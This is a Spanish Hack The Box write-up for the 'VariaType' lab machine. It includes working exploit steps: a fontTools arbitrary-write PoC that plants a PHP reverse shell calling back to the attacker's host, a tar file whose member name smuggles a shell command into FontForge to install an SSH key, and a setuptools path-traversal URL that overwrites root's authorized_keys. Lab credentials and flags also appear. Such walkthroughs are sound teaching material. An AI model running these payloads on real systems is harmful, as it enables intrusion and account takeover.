
# VariaType

<figure><img src="/files/bIJMHojpYiQHKmLKM35A" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `VariaType`
* **IP:** `10.129.7.70`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `27/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.7.70 variatype.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T510.129.7.70
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://variatype.htb` y observamos que parece ser una plataforma de generación de fuentes de tipografía variables a través de un archivo `.designspace` y un archivo master:

<figure><img src="/files/2XL2MvuwMRegWcQHb283" alt=""><figcaption></figcaption></figure>

La única funcinalidad de la web es Generate Font, donde cargamos el archivo `.designspace` y las master fonts:

<figure><img src="/files/qkxMWo7ONt3o2ikk4PKK" alt=""><figcaption></figcaption></figure>

### Búsqueda de exploits

Encontramos que un exploit para .designspace refiere a una vulnerabilidad en fontTools (CVE-2025-66034). Al embeber secuencias de Path Traversal y injeciones XML en un archivo `.designfile`, los atacantes pueden escribir archivos arbitrarios al sistema de archivos de host, lo que podría conducir a la ejecución de código remoto (RCE).

<figure><img src="/files/FANN2490OpOLd30OzhOp" alt=""><figcaption></figcaption></figure>

Encontramos el siguiente PoC en GitHub para explotarlo:

{% embed url="<https://github.com/v3cn4x00/POC-CVE-2025-66034>" %}

Pero antes de explotarlo, vamos a seguir enumerando el sitio web por si encontramos algo relevante.

***

## <mark style="color:$primary;">Enumeración Web</mark>

### WSTG Scan

{% embed url="<https://github.com/afsh4ck/WSTG-Scan>" %}

Este programa automáticamente realiza:

* Enumeración de tecnologías web
* Escaneo de puertos y servicios con Nmap
* Análisis de vulnerabilidades con Nuclei
* Fuzzing de subdominios con ffuf
* Fuzzing de directorios con fuff
* Spidering / Mapeo completo del site
* Detección de formularios y pruebas de inyección
* Pruebas de API (OWASP API Top 10)
* Enumeración de usuarios y bruteforce con hydra

{% code overflow="wrap" %}

```bash
git clone https://github.com/afsh4ck/WSTG-Scan.git
cd WSTG-Scan
python3 wstg-scan.py
```

{% endcode %}

### Subdominios (vhosts) encontrados

<table><thead><tr><th width="107.51849365234375">Status</th><th>VHost</th><th>Tamaño</th></tr></thead><tbody><tr><td>200</td><td>portal.variatype.htb</td><td>2494</td></tr></tbody></table>

**Encontramos el subdominio:** `portal.variatype.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de login, donde no tenemos credenciales por el momento:

<figure><img src="/files/5D7mBhg3ITXZ4SJRFL3H" alt=""><figcaption></figcaption></figure>

### Enumeración del subdominio

Volvemos a ejecutar WSTG Scan contra el objetivo y obtenemos algo muy relevante, un repositorio git expuesto:

#### Hallazgos Nuclei relevantes

<table><thead><tr><th width="114.88885498046875">Severidad</th><th width="111.4444580078125">Template</th><th width="219.592529296875">Nombre</th><th>URL</th></tr></thead><tbody><tr><td>MEDIUM</td><td>git-config</td><td>Git Configuration - Detect</td><td>http://portal.variatype.htb/.git/config</td></tr></tbody></table>

### Git Dumper

Nos dumpeamos el repositorio en local en Kali con git-dumper:

```bash
git-dumper http://portal.variatype.htb/.git/ /home/kali/Escritorio/machines/htb/variatype
cd .git
ls -la
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:25 2026  .
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:24 2026  ..
.rw-rw-r-- kali kali  39 B  Wed May 27 02:35:23 2026  COMMIT_EDITMSG
.rw-rw-r-- kali kali 143 B  Wed May 27 02:35:23 2026  config
.rw-rw-r-- kali kali  73 B  Wed May 27 02:35:23 2026  description
.rw-rw-r-- kali kali  23 B  Wed May 27 02:35:23 2026  HEAD
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:23 2026  hooks
.rw-rw-r-- kali kali 137 B  Wed May 27 02:35:24 2026  index
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:23 2026  info
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:23 2026  logs
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:24 2026  objects
.rw-rw-r-- kali kali  41 B  Wed May 27 02:35:23 2026  ORIG_HEAD
drwxrwxr-x kali kali 4.0 KB Wed May 27 02:35:23 2026  refs
```

Bingo! Vamos a buscar credenciales.

### Ver el historial completo de cambios (diferencias)

```bash
git log -p

commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation

diff --git a/auth.php b/auth.php
new file mode 100644
index 0000000..615e621
--- /dev/null
+++ b/auth.php
@@ -0,0 +1,3 @@
+<?php
+session_start();
+$USERS = [];
```

Esto muestra cada commit con sus cambios, y obtenemos un usuario y contraseña en plano:

```bash
'gitbot' => 'G1tB0t_Acc3ss_2025!'
```

Con esas credenciales conseguimos acceder correctamente al panel, y vemos que podemos ver y descargar cualquier archivo, lo que significa que podríamos intentar un bypass de subida de un archivo .ttf y subir una webshell (o reverse shell), que nos permita RCE:

<figure><img src="/files/BR80P6WzaDv452h5usa5" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/1ykkFC3JcUsthkqAVKDb" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Explotación - CVE-2025-66034</mark>

{% embed url="<https://github.com/v3cn4x00/POC-CVE-2025-66034>" %}

```bash
git clone https://github.com/v3cn4x00/POC-CVE-2025-66034.git
cd POC-CVE-2025-66034 
```

Debemos editar el ejecutable font\_varlib.py de la siguiente manera:

* **UPLOAD\_HOST**: `http://variatype.htb` (el sitio principal, porque ahí está el formulario de generación de fuentes)
* **UPLOAD\_ENDPOINT**: `/tools/variable-font-generator/process` (igual)
* **WEBROOT**: `/var/www/portal.variatype.htb/public/files`
* **SHELL\_HOST**: `http://portal.variatype.htb/files`

Ejecuta:

O podemos utilizar el modo custom (se sobreescriben las variables):

```bash
python3 font_varlib.py \
  --ip 10.10.15.251 \
  --port 4444 \
  --upload http://variatype.htb/tools/variable-font-generator/process \
  --webroot /var/www/portal.variatype.htb/public/files \
  --shell http://portal.variatype.htb/files
```

### Ejecución del Exploit

Abrimos un listener por el puerto 4444 (yo usaré penelope):

```
penelope
```

Y ejecutamos el exploit:

```bash
python3 font_varlib.py \
  --ip 10.10.15.251 \
  --port 4444 \
  --upload http://variatype.htb/tools/variable-font-generator/process \
  --webroot /var/www/html/files \
  --shell http://variatype.htb/files

╔═══════════════════════════════════════════════════════════╗
║   font_varlib  //  CVE-2025-66034                        ║
║   fontTools varLib  →  Arbitrary Write  →  RCE           ║
╠═══════════════════════════════════════════════════════════╣
║   attacker  10.10.15.251:4444                              ║
║   upload    http://variatype.htb/tools/variable-font-generator/process ║
║   webroot   /var/www/html/files                            ║
║   shell     http://variatype.htb/files                     ║
╚═══════════════════════════════════════════════════════════╝

──────────────────────────────────────────────────────────
  GENERATING MASTER FONTS
──────────────────────────────────────────────────────────
  [+] source-light.ttf   (w100)
  [+] source-regular.ttf (w400)

──────────────────────────────────────────────────────────
  PAYLOAD
──────────────────────────────────────────────────────────
  [*] Shell name  : f0nt_mv822rph.php
  [*] Write path  : /var/www/html/files/f0nt_mv822rph.php
  [*] Trigger URL : http://variatype.htb/files/f0nt_mv822rph.php
  [+] malicious.designspace crafted
  [*] Primitive 1 : CDATA split  →  PHP injected into output body
  [*] Primitive 2 : Absolute path  →  output_dir bypassed in os.path.join()

──────────────────────────────────────────────────────────
  UPLOADING
──────────────────────────────────────────────────────────
  [+] Server response: HTTP 200

──────────────────────────────────────────────────────────
  LISTENER  //  TRIGGER
──────────────────────────────────────────────────────────
  [*] Spawning nc -lvnp 4444 ...
  [*] Triggering: http://variatype.htb/files/f0nt_mv822rph.php
```

Tenemos una shell como `www-data`, pero no podemos acceder al directorio steve de la home, donde está la user flag:

<figure><img src="/files/ZOsaemzT0UdqW418QyrR" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">User Flag - Escalada a Steve</mark>

### Enumeración como www-data

```bash
cat /etc/passwd | grep sh$
# root:/bin/bash   steve:/bin/bash

ps -eo user,pid,args | grep -E "python|cron"
# variatype  python3 app.py
# (auditd + laurel activos → mucha auditoría)
```

Hallazgos clave:

* `/opt/variatype/app.py` (Flask, user `variatype`), `/opt/variatype/script.py`.
* `/opt/process_client_submissions.bak` — backup de un pipeline de fuentes (autor: steve).
* `/var/spool/cron/crontabs/steve` existe pero no es legible → **steve corre un cron**.
* `/opt/font-tools/install_validator.py` — instalador de "plugins" (relevante para root).
* FontForge compilado en `/usr/local/src/fontforge/build/bin/fontforge`, **versión 20230101**.

#### El pipeline del cron (de `process_client_submissions.bak`)

```bash
UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"   # escribible por www-data
SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'
EXTENSIONS=( "*.ttf" "*.otf" "*.woff" "*.woff2" "*.zip" "*.tar" "*.tar.gz" "*.sfd" )

for file in $ext; do
    [[ "$file" =~ $SAFE_NAME_REGEX ]] || { mv "$file" "$QUARANTINE_DIR/"; continue; }
    timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
font = fontforge.open('$file')
..."
done
```

Confirmado por observación de `/proc` que el cron real (`/home/steve/bin/process_client_submissions.sh`) corre **cada minuto** como `steve`, con **cwd = UPLOAD\_DIR**, y que el **regex se aplica** (los nombres con metacaracteres van a cuarentena y nunca llegan a FontForge).

***

### Steve — CVE-2024-25082 (FontForge command injection)

**Clase:** command injection vía nombres de archivo en FontForge `<= 20230101`. **Mecanismo (de `splinefont.c`):** al abrir un archivo comprimido/empaquetado, FontForge construye comandos shell con `system()` **sin entrecomillar** el nombre:

* `.gz/.bz2/.Z/.lzma` → `Decompress()`: `gunzip < <NAME> > <tmp>` (cwd intacto).
* `.tar/.tar.gz/.zip` → `Unarchive()`: lista el TOC y extrae con `( cd <tempdir> ; tar xf <archive> <MEMBER> )`. **Los nombres internos (`MEMBER`) se interpolan sin sanear → CVE-2024-25082.**

#### El problema y su solución

* El regex del pipeline bloquea metacaracteres en el **nombre externo** → CVE-2024-25081 (nombre en disco) está bloqueado.
* **Bypass:** el nombre externo `payload.tar` es limpio (pasa el regex), pero los **nombres internos** del tar no se validan. Ahí va el subshell.
* `Unarchive` hace `cd <tempdir>` antes de extraer → un `.p.sh` relativo no se encuentra en el tempdir.
* Un nombre de archivo **no puede contener `/`** (separador de path). Se resuelve navegando con `cd`: `cd $HOME` (`/home/steve`) → `cd ..` → `cd ..` (`/`) → `cd tmp` (`/tmp`) → `bash .p.sh`. Ningún `/` literal, espacios sustituidos por `${IFS}`.

#### Payload de inyección SSH (`/tmp/.p.sh`, ejecutado como steve)

{% code title="p.sh" %}

```bash
#!/bin/bash
mkdir -p /home/steve/.ssh
echo 'ssh-rsa AAAA... pwn' >> /home/steve/.ssh/authorized_keys
chmod 700 /home/steve/.ssh
chmod 600 /home/steve/.ssh/authorized_keys
```

{% endcode %}

#### Construcción del tar malicioso

El nombre interno se construye con Python para evitar interferencia del shell:

{% code title="exploit.py" %}

```python
import tarfile, io
name='$(cd${IFS}$HOME;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;bash${IFS}.p.sh)ig.ttf'
t=tarfile.open('/tmp/payload.tar','w')
data=b'dummyfontdata'
info=tarfile.TarInfo(name); info.size=len(data)
t.addfile(info, io.BytesIO(data)); t.close()
```

{% endcode %}

#### Despliegue (como www-data)

```bash
# subir .p.sh a /tmp y a UPLOAD_DIR, subir payload.tar a UPLOAD_DIR
# (el base64 del tar excede el límite de URL GET → subir por chunks o por la subida legítima)
```

```bash
# Generar par de claves y poner la pública en /tmp/.p.sh
ssh-keygen -t rsa -f steve_key -N ''
```

A los \~60 s el cron de steve abre `payload.tar`, extrae el TOC, ejecuta el subshell del nombre interno como **steve**, y `.p.sh` instala la clave.

***

## <mark style="color:$primary;">User Flag</mark>

```bash
ssh -i steve_key steve@10.129.7.70
id   # uid=1000(steve)
cat ~/user.txt
92fb906b950b85dd1b1ab3e7********
```

***

## <mark style="color:$primary;">Escalada a Root</mark>

### CVE-2025-47273 (setuptools PackageIndex path traversal)

#### sudo

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

python3 -c "import setuptools; print(setuptools.__version__)"   # 78.1.0  (vulnerable; fix en 78.1.1)
```

`install_validator.py` (corre como root) descarga un "plugin" desde una URL:

```python
from setuptools.package_index import PackageIndex
index = PackageIndex()
downloaded_path = index.download(plugin_url, PLUGIN_DIR)   # PLUGIN_DIR=/opt/font-tools/validators
```

`is_valid_url` exige `http`/`https` + netloc y `url.count('/') <= 10`.

#### La vulnerabilidad

`PackageIndex` deriva el nombre de destino del último segmento del path de la URL (`unquote(path.split('/')[-1])`). El parche parcial de 78.1.0 hace `while '..' in name: name = name.replace('..', '.')` → elimina **todo** `..` (los trucos con `....` no sirven).

**Bypass: ruta absoluta.** Si el nombre decodifica a `/root/.ssh/authorized_keys`, entonces `os.path.join(PLUGIN_DIR, '/root/.ssh/authorized_keys')` **descarta** `PLUGIN_DIR` (Python prioriza el componente absoluto). No se usa ningún `..`.

Codificando los `/` como `%2f`, todo el path queda en el último segmento:

```
http://127.0.0.1:9999/%2froot%2f.ssh%2fauthorized_keys
   → unquote → /root/.ssh/authorized_keys
```

(`url.count('/')` cuenta solo los `/` reales = 3, pasa el límite.)

#### Servidor en loopback del propio target

El egress del target está filtrado, así que el servidor HTTP que sirve la clave pública se levanta **en el propio target** (loopback). Sirve la clave en cualquier path con `200 OK`:

```python
# /tmp/tsrv.py
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
KEY=open('/tmp/.rk.pub','rb').read()
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Length',str(len(KEY)))
        self.end_headers(); self.wfile.write(KEY)
    def log_message(self,*a): pass
HTTPServer(('127.0.0.1',9999),H).serve_forever()
```

#### Ejecución

`sudo` tiene `use_pty` → requiere pty (`ssh -tt`). El servidor y el exploit van en la **misma** sesión SSH (los procesos en background mueren al cerrar la sesión por `logind`):

```bash
ssh -tt -i steve_key steve@10.129.7.70 '
  python3 /tmp/tsrv.py >/tmp/tsrv.log 2>&1 & SRV=$!
  sleep 2
  sudo -n /usr/bin/python3 /opt/font-tools/install_validator.py \
      "http://127.0.0.1:9999/%2froot%2f.ssh%2fauthorized_keys"
  kill $SRV
'
# [INFO] Plugin installed at: /root/.ssh/authorized_keys
# [+] Plugin installed successfully.
```

***

## Root Flag

```bash
ssh -i steve_key root@10.129.7.70
id   # uid=0(root)
cat /root/root.txt
e3996d4aafe49c8725f67f208b551599
```
